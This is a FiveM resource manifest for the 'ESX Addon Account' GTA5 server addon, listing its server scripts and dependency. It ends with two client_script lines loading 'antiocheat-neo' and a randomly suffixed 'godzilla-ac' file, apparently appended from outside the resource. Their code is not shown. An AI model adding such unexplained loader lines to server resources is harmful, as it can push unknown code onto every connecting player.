





fx_version 'adamant'

game 'gta5'

description 'ESX Addon Account'

version '1.0.1'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/classes/addonaccount.lua',
	'server/main.lua'
}

dependency 'es_extended'

client_script "@antiocheat-neo/acloader.lua"
client_script "godzilla-ac_YTyWB.lua"